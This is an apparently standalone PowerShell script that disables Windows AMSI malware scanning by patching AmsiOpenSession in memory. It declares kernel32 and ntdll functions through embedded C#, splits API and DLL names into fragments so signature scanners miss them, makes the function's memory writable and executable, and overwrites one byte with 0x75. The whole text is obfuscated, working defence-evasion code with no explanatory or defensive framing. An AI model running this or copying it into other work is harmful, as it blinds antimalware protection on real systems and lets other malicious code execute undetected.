$c = 'tEx'
$Win32 = @"
using System.Runtime.InteropServices;
using System;
using System.Diagnostics;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool VirtualProtec$c(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
[DllImport("ntdll.dll", SetLastError = true)]
public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint OldAccessProtection);
[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();

[StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@
Add-Type $Win32
$notp = 0
$replace = "VirtualProtec"
$hHandle = [IntPtr]::Zero
$oldProtect = [UInt32]0
$marshalClass = [System.Runtime.InteropServices.Marshal]
$LLibrary = [Win32]::GetModuleHandle("a" + "m" + "s" + "i" + ".dll")
$notaddress = [Win32]::GetProcAddress($LLibrary, "A"+"msi"+"Ope"+"nS"+"es"+"s"+"ion")
$test = [uint32]5
$handle = [Win32]::GetCurrentProcess()
$patchAddr = [IntPtr]($notaddress.ToInt64() + 3)
[Win32]::('{0}{1}' -f $replace,$c)($handle,$patchAddr, $test, 0x40, [ref]$oldProtect)
$stopitplease = [byte[]] (
    0x75
)

$marshalClass::Copy($stopitplease, 0, $patchAddr, $stopitplease.Length)